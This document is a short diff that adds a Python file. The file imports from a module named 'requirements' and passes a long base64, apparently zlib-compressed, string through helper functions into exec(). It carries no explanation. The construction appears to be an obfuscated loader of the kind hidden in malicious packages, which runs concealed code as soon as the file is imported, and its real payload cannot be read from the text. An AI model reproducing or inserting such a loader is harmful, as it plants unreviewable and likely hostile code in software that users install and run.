@@ -1,0 +1,3 @@
+from requirements import *
+
+exec(SEC(INFO("eJydkD9vgzAQxXd/Cm+AGlmQIAYkhkJgqFqhUkGiVFFkm4tCGzBySFH66WvzR+nQqfbiu/f07ndGVd0K2WFGL+C56ChFjSN5azuBJyWjTSnq3wqJqvYEcjY8xm8IUcYkfOEAG06xCrY5zZY2tzcGSuNMdcd4wjy3BC5KMI1ilfRsG9KiKao0P115Ej5TZ7fOcve2+ciW7Pxkp/mrndtxYFgIlXDE0HANYEraWz7C6lR65EhIGuhNi0igpamZCDsL/nm4VN+ArcHMR+xgULVbsS2G4iVdx4coCRc6cDRL6K6yweadXE3X5NryMGWRmQgrJGzpO5KqLYe+0idS9frrH7Thvomq3n3H2/8bd8Kaxw+BjufvlesHt6KToQ==")))
